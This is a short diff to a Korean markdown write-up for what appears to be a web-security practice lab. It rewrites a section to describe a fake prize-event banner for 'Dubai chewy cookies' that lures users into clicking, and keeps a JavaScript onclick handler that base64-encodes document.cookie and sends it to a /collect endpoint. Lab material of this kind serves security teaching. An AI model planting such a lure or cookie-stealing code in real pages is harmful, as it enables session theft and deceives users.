@@ -51,8 +51,9 @@ app.config.update(
 )
 ```
 
-### 2.3 실습용 '공격 실행' 버튼 메커니즘
-- **파일 위치**: `was/app/templates/posts/list.html` ([L54-L59](file:///c:/workspace/PJT2/was/app/templates/posts/list.html#L54-L59))
+### 2.3 실습용 위장 광고 배너 (Social Engineering)
+- **파일 위치**: `was/app/templates/posts/list.html` ([L53-L74](file:///c:/workspace/PJT2/was/app/templates/posts/list.html#L53-L74))
+- **설명**: 최근 인기 있는 **'두바이 쫀득 쿠키(두쫀쿠)'** 경품 이벤트 배너로 위장하여 클릭을 유도합니다. 사용자가 유행에 민감하다는 점을 이용한 전형적인 사회공학적 공격 사례입니다.
 - **실행 코드**: 
   ```javascript
   onclick="fetch('/collect?cookie=' + btoa(document.cookie))"
